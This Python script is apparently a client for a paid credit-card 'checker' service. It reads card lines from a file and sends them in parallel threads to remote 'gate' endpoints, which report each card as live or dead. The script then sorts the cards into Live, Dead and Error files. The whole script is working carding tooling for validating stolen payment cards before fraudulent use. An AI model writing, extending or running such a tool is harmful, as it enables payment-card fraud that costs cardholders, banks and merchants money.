import requests
import json
import sys
import time
import threading
from pathlib import Path
try:
    from colorama import init as colorama_init, Fore, Style

    colorama_init(autoreset=True)
    HAS_COLORAMA = True
except ImportError:
    HAS_COLORAMA = False
    Fore = type("Fore", (), {"GREEN": "", "RED": "", "YELLOW": ""})()
    Style = type("Style", (), {"RESET_ALL": ""})()

CONFIG_PATH = Path(__file__).with_name("config.json")
API_KEY = ""
TOKEN = ""


def request_json_with_retry(
    method: str,
    url: str,
    *,
    max_attempts: int = 5,
    retry_delay: float = 1.0,
    timeout: float = 20.0,
    **kwargs,
) -> dict | list:
    last_error = None
    for attempt in range(1, max_attempts + 1):
        try:
            response = requests.request(method, url, timeout=timeout, **kwargs)
            response.raise_for_status()
            return response.json()
        except (requests.RequestException, ValueError) as e:
            last_error = e
            if attempt >= max_attempts:
                break
            print(f"Request failed (attempt {attempt}/{max_attempts}), retrying...")
            time.sleep(retry_delay)
    raise RuntimeError(f"Request failed after {max_attempts} attempts: {last_error}")


def load_config() -> dict:
    if not CONFIG_PATH.exists():
        return {}
    try:
        with open(CONFIG_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
            if isinstance(data, dict):
                return data
    except (OSError, json.JSONDecodeError):
        pass
    return {}


def save_config(api_key: str, token: str) -> None:
    payload = {
        "api_key": api_key.strip(),
        "token": token.strip(),
    }
    with open(CONFIG_PATH, "w", encoding="utf-8") as f:
        json.dump(payload, f, ensure_ascii=True, indent=2)


def prompt_credentials() -> tuple[str, str]:
    while True:
        api_key = input("Enter API_KEY: ").strip()
        token = input("Enter TOKEN: ").strip()
        if api_key and token:
            return api_key, token
        print("API_KEY and TOKEN must not be empty.")


def check_credit() -> bool:
    global API_KEY, TOKEN

    url = "https://server.checkerccv.tv/check_credit.php"
    data = {
        'key': API_KEY
    }
    headers = {
        'Authorization': f'Bearer {TOKEN}'
    }
    try:
        result = request_json_with_retry(
            "POST",
            url,
            data=data,
            headers=headers,
        )
    except RuntimeError as e:
        print(f"Unable to verify credit: {e}")
        return False

    if isinstance(result, dict) and result.get('status') == 'success':
        credit = result.get('data', {}).get('credit')
        print(f"Credit balance: {credit}")
        return True

    message = result.get('message') if isinstance(result, dict) else "Invalid response."
    print(f"Error: {message}")
    return False

def get_gate():
    url = "https://checkerccv.tv/data/gates.json"
    gates = request_json_with_retry("GET", url)

    active_gates = [gate for gate in gates if gate['isEnabled']]
    for i, gate in enumerate(active_gates, start=1):
        print(f"{i}. {gate['description']}")

    return active_gates


FILE_LOCK = threading.Lock()


def append_to_file(filename: str, line: str) -> None:
    with FILE_LOCK:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(line + "\n")


class FatalCheckError(Exception):
    pass


def handle_check_result(listcc: str, result: dict, *, stop_event: threading.Event) -> None:
    error_code = result.get("errorCode")
    credits = result.get("credits")

    live_file = "Live.txt"
    dead_file = "Dead.txt"
    error_file = "Error.txt"

    # Error codes:
    # 0 = Live
    # 1 = Unknown (will retry)
    # 2 = Dead
    # 3 = Unknown (will retry)
    # 4 = Error (unsupported card)
    # 5 = Invalid key or insufficient credits
    # 6 = Gate maintenance

    if error_code == 0:
        print(f"{Fore.GREEN}Live | {listcc}{Style.RESET_ALL}" if HAS_COLORAMA else f"Live | {listcc}")
        append_to_file(live_file, listcc)
        return

    if error_code == 2:
        print(f"{Fore.RED}Dead | {listcc}{Style.RESET_ALL}" if HAS_COLORAMA else f"Dead | {listcc}")
        append_to_file(dead_file, listcc)
        return

    if error_code in (1, 3):
        raise RuntimeError("UNKNOWN_RETRY")

    if error_code == 4:
        print(f"{Fore.YELLOW}Error | {listcc}{Style.RESET_ALL}" if HAS_COLORAMA else f"Error | {listcc}")
        append_to_file(error_file, listcc)
        return

    if error_code == 5:
        print(
            f"{Fore.YELLOW}Error 5: Invalid key or insufficient credits{Style.RESET_ALL}"
            if HAS_COLORAMA
            else "Error 5: Invalid key or insufficient credits"
        )
        if credits is not None:
            print(f"{Fore.YELLOW}Credits: {credits}{Style.RESET_ALL}" if HAS_COLORAMA else f"Credits: {credits}")
        stop_event.set()
        raise FatalCheckError("Fatal errorCode=5")

    if error_code == 6:
        print(
            f"{Fore.YELLOW}Error 6: Gate maintenance{Style.RESET_ALL}"
            if HAS_COLORAMA
            else "Error 6: Gate maintenance"
        )
        if credits is not None:
            print(f"{Fore.YELLOW}Credits: {credits}{Style.RESET_ALL}" if HAS_COLORAMA else f"Credits: {credits}")
        stop_event.set()
        raise FatalCheckError("Fatal errorCode=6")

    print(
        f"{Fore.YELLOW}Error (unknown errorCode={error_code}) | {listcc}{Style.RESET_ALL}"
        if HAS_COLORAMA
        else f"Error (unknown errorCode={error_code}) | {listcc}"
    )
    append_to_file(error_file, listcc)


def prompt_int(prompt: str, *, min_value: int, max_value: int) -> int:
    while True:
        raw = input(prompt).strip()
        try:
            value = int(raw)
        except ValueError:
            print("Invalid input. Please enter a number.")
            continue

        if value < min_value or value > max_value:
            print(f"Please enter a value between {min_value} and {max_value}.")
            continue

        return value


def count_listcc_lines(filename: str) -> int:
    try:
        with open(filename, "r", encoding="utf-8") as f:
            return sum(1 for line in f if line.strip())
    except FileNotFoundError:
        raise


def pop_next_listcc_line(filename: str, file_lock: threading.Lock) -> str | None:
    # Pop từng dòng đầu tiên để tránh trùng ở lần chạy sau
    with file_lock:
        try:
            with open(filename, "r+", encoding="utf-8") as f:
                lines = f.readlines()
                while lines and not lines[0].strip():
                    lines.pop(0)
                if not lines:
                    return None

                current_line = lines.pop(0).strip()
                remaining_lines = "".join(lines)

                f.seek(0)
                f.write(remaining_lines)
                f.truncate()
                return current_line
        except FileNotFoundError:
            raise


def pop_listcc_from_file(filename: str) -> list[str]:
    # Giữ lại để tương thích cũ nếu cần gọi ở nơi khác
    try:
        with open(filename, "r+", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
            f.seek(0)
            f.truncate()
            return lines
    except FileNotFoundError:
        raise


def check_card(
    listcc,
    gatecode,
    *,
    stop_event: threading.Event,
    attempt: int = 1,
    max_attempts: int = 5,
):
    if stop_event.is_set():
        return None

    url = "https://server.checkerccv.tv/checker.php"
    headers = {
        'Authorization': f'Bearer {TOKEN}'
    }
    data = {
        'key': API_KEY,
        'listcc': listcc,
        'gatecode': gatecode    
    }
    try:
        result = request_json_with_retry(
            "POST",
            url,
            data=data,
            headers=headers,
            max_attempts=max_attempts,
        )
    except RuntimeError:
        if attempt >= max_attempts:
            print(
                f"{Fore.YELLOW}Error (request/json failed) | {listcc}{Style.RESET_ALL}"
                if HAS_COLORAMA
                else f"Error (request/json failed) | {listcc}"
            )
            append_to_file("Error.txt", listcc)
            return None
        time.sleep(1.0)
        return check_card(
            listcc,
            gatecode,
            stop_event=stop_event,
            attempt=attempt + 1,
            max_attempts=max_attempts,
        )

    if stop_event.is_set():
        return None

    try:
        handle_check_result(listcc, result, stop_event=stop_event)
    except RuntimeError as e:
        if str(e) == "UNKNOWN_RETRY":
            if stop_event.is_set():
                return None
            if attempt >= max_attempts:
                print(
                    f"{Fore.YELLOW}Unknown (max attempts reached) | {listcc}{Style.RESET_ALL}"
                    if HAS_COLORAMA
                    else f"Unknown (max attempts reached) | {listcc}"
                )
                append_to_file("Error.txt", listcc)
                return result

            time.sleep(1.0)  # throttle retry
            return check_card(
                listcc,
                gatecode,
                stop_event=stop_event,
                attempt=attempt + 1,
                max_attempts=max_attempts,
            )
        raise

    return result


def main() -> None:
    global API_KEY, TOKEN

    config = load_config()
    API_KEY = str(config.get("api_key", "")).strip()
    TOKEN = str(config.get("token", "")).strip()

    while True:
        if not API_KEY or not TOKEN:
            API_KEY, TOKEN = prompt_credentials()
            save_config(API_KEY, TOKEN)

        if check_credit():
            break

        print("Invalid API_KEY or TOKEN. Please input again.")
        API_KEY, TOKEN = prompt_credentials()
        save_config(API_KEY, TOKEN)

    listcc_filename = "listcc.txt"
    try:
        total = count_listcc_lines(listcc_filename)
    except FileNotFoundError:
        print(f"File not found: {listcc_filename}")
        sys.exit(1)

    if total == 0:
        print(f"{listcc_filename} is empty.")
        sys.exit(1)

    gates = get_gate()
    if not gates:
        print("No enabled gates found.")
        sys.exit(1)

    choice = prompt_int(
        "Choose gate by number (starting from 1): ",
        min_value=1,
        max_value=len(gates),
    )
    gatecode = gates[choice - 1]["id"]

    threads_count = prompt_int(
        "Enter number of threads: ",
        min_value=1,
        max_value=max(1, min(64, total)),
    )

    stop_event = threading.Event()
    fatal_lock = threading.Lock()
    fatal_message = {"message": ""}
    list_file_lock = threading.Lock()
    progress_lock = threading.Lock()
    progress = {"count": 0}

    def worker(thread_id: int) -> None:
        while not stop_event.is_set():
            try:
                listcc = pop_next_listcc_line(listcc_filename, list_file_lock)
                if listcc is None:
                    return
            except FileNotFoundError:
                with fatal_lock:
                    if not fatal_message["message"]:
                        fatal_message["message"] = f"File not found: {listcc_filename}"
                stop_event.set()
                return

            try:
                with progress_lock:
                    progress["count"] += 1
                    idx = progress["count"]
                print(f"[Thread {thread_id}] Processing {idx}/{total}...")
                check_card(listcc, gatecode, stop_event=stop_event)
            except FatalCheckError as e:
                with fatal_lock:
                    if not fatal_message["message"]:
                        fatal_message["message"] = str(e)
                stop_event.set()
                return

    threads = []
    for thread_id in range(1, threads_count + 1):
        t = threading.Thread(target=worker, args=(thread_id,), daemon=False)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    if fatal_message["message"]:
        sys.exit(1)

if __name__ == "__main__":
    main()